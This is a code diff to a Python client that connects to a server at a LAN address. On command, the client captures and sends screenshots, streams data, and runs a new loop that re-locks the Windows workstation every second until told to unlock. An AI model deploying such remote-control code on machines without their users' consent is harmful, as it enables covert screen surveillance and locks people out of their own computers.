@@ -14,7 +14,9 @@ global userid
 
 
 killSnap = 0
+killLock = 0
 DEBUG = 1
+SERVER_IP = "192.168.1.103"
 
 def log(msg):
 	if DEBUG:
@@ -24,7 +26,7 @@ def log(msg):
 def get_stream(userid):
 	# Connect to the stream request handler on the server
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect(("127.0.0.1", 8004))
+	s.connect((SERVER_IP, 8004))
 
 	# Send the requested userid to the server
 	s.send(userid)
@@ -75,8 +77,16 @@ def get_stream(userid):
 	f.close()
 
 def lockscreen_handler():
-	# TODO think of a way to lock the user until other command
-	ctypes.windll.user32.LockWorkStation()
+	global killLock
+
+	while True:
+		if killLock:
+			log('Unlocking the client')
+			break
+
+		ctypes.windll.user32.LockWorkStation()
+		time.sleep(1)
+
 	return
 
 
@@ -84,7 +94,7 @@ def snap_handler(userid):
 	global killSnap
 	log('started snap handler')
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect(("127.0.0.1", 10000))
+	s.connect((SERVER_IP, 10000))
 	snapid = 0
 	image_timestamp = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M")
 	image_date = image_timestamp.split('T')[0]
@@ -96,7 +106,7 @@ def snap_handler(userid):
 			log('killSnap, breaking')
 			return
 		snapshot = ImageGrab.grab() # TODO Lower quality
-		save_path = "C:\\Users\\user\\MySnapshot.jpg"
+		save_path = "C:\\Users\\user\\MySnapshot_{0}.jpg".format(random.randint(0,99999))
 		snapshot.save(save_path)
 		#log('got snap, snapid: ' + str(snapid))
 		# Send
@@ -136,9 +146,10 @@ def snap_handler(userid):
 
 
 def main():
+	global killLock
 	global killSnap
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect(("127.0.0.1", 8002))
+	s.connect((SERVER_IP, 8002))
 	log('connected')
 	userid = random.randint(1,10001)
 	snap_thread = -1
@@ -157,7 +168,9 @@ def main():
 			killSnap = 0
 			threading.Thread(target=snap_handler, args=(userid,)).start()
 		elif req == 'lockscreen':
-			lockscreen_handler()
+			threading.Thread(target=lockscreen_handler).start()
+		elif req == 'unlockscreen':
+			killLock = 1
 		elif req == 'stopsnap':
 			killSnap = 1
 		elif req.startswith('stream'):
